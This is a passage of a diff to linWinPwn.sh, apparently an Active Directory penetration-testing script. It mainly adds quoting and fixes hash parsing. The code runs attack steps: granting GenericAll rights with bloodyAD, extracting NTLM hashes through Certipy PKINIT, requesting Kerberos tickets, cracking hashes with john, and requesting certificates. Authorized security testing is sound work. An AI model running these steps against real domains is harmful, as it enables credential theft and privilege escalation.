+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} '${user}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3961,13 +3962,13 @@ pkinit_auth() {
     current_dir=$(pwd)
     cd "${output_dir}/Credentials" || exit
     if [[ "${pfxpass}" == "" ]]; then
-        run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+        run_command "${certipy} auth -pfx '${pfxcert}' -dc-ip ${dc_ip} -username '${user}' -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
     else
         echo -e "${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}"
-        run_command "${certipy} cert -export -pfx $(realpath "$pfxcert") -password $pfxpass -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
-        run_command "${certipy} auth -pfx ${user}_unprotected.pfx -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+        run_command "${certipy} cert -export -pfx $(realpath "$pfxcert") -password $pfxpass -out '${user}_unprotected.pfx'" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+        run_command "${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip} -username '${user}' -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
     fi
-    hash=$(grep "Got hash for" "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" | cut -d " " -f 6)
+    hash=$(grep "Got hash for" "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" | cut -d ":" -f 2,3| cut -d " " -f 2)
     echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
     cd "${current_dir}" || exit
 }
@@ -4469,8 +4470,8 @@ kerberos_menu() {
             if [ "${nullsess_bool}" == true ]; then
                 echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
             else
-                tick_spn="CIFS/${dc_domain}"
-                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                tick_spn="CIFS/${dc_FQDN}"
+                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_FQDN}):"
                 read -rp ">> " tick_spn_value </dev/tty
                 if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                 echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
@@ -4479,12 +4480,12 @@ kerberos_menu() {
                 run_command "${impacket_getST} ${argument_imp} -dc-ip ${dc_ip} -spn ${tick_spn}" | tee -a "${output_dir}/Credentials/getST_output_${dc_domain}"
                 ticket_ccache_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                 ticket_kirbi_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
-                run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
+                run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
                 cd "${current_dir}" || exit
                 if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
-                    echo -e "${GREEN}[+] TGS for SPN ${tick_spn} generated successfully:${NC} $krb_ticket"
-                    echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
-                    echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
+                    echo -e "${GREEN}[+] TGS for SPN ${tick_spn} generated successfully:${NC}"
+                    echo -e "'${output_dir}/Credentials/${ticket_ccache_out}'"
+                    echo -e "'${output_dir}/Credentials/${ticket_kirbi_out}'"
                 else
                     echo -e "${RED}[-] Failed to request ticket${NC}"
                 fi
@@ -5509,7 +5510,7 @@ auth_menu() {
         if [ "${pass_bool}" == true ]; then
             hash_gen="$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$password") | $(which openssl) dgst -md4 | cut -d " " -f 2)"
             echo -e "${GREEN}[+] NTLM hash generated:${NC} ${hash_gen}"
-            echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -H ${hash_gen}"
+            echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -H ${hash_gen}"
         else
             echo -e "${RED}[-] Error! Requires password...${NC}"
         fi
@@ -5528,7 +5529,7 @@ auth_menu() {
                 if [[ "${john_out}" == *"1 password"* ]]; then
                     password_cracked=$(echo "$john_out" | cut -d ":" -f 2 | cut -d " " -f 1)
                     echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -p ${password_cracked}"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -p ${password_cracked}"
                 else
                     echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
                 fi
@@ -5551,8 +5552,8 @@ auth_menu() {
                 cd "${current_dir}" || exit
                 if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
                     krb_ticket="${output_dir}/Credentials/${user}.ccache"
-                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -K ${krb_ticket}"
+                    echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket'"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}'"
                 else
                     echo -e "${RED}[-] Failed to generate TGT${NC}"
                 fi
@@ -5604,13 +5605,13 @@ auth_menu() {
                 if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
                     pfxcert="${output_dir}/Credentials/${user}.pfx"
                     pfxpass=""
-                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
+                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} '${output_dir}/Credentials/${user}.pfx'"
                     $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
                     if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
                         pem_cert="${output_dir}/Credentials/${user}.pem"
-                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${pem_cert}"
+                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${pem_cert}'"
                     fi
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -C ${pem_cert}"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -C '${pfxcert}'"
                 else
                     echo -e "${RED}[-] Failed to request certificate${NC}"
                 fi
@@ -5626,10 +5627,10 @@ auth_menu() {
             echo -e "${RED}[-] Please verify the installation of aesKrbKeyGen.py${NC}"
         else
             if [ "${pass_bool}" == true ]; then
-                aes_gen=$("${python3}" "${aesKrbKeyGen}" -domain "${domain}" -u "${user}" -pass "${password}")
+                aes_gen=$("${python3}" "${aesKrbKeyGen}" -domain "${domain}" -u "'${user}'" -pass "${password}")
                 echo -e "${GREEN}[+] AES Keys generated:${NC} ${aes_gen}"
                 aes_key=$(echo -e "${aes_gen}" | grep "AES256" | cut -d " " -f 4)
-                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -A ${aes_key}"
+                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
             else
                 echo -e "${RED}[-] Error! Requires password...${NC}"
             fi
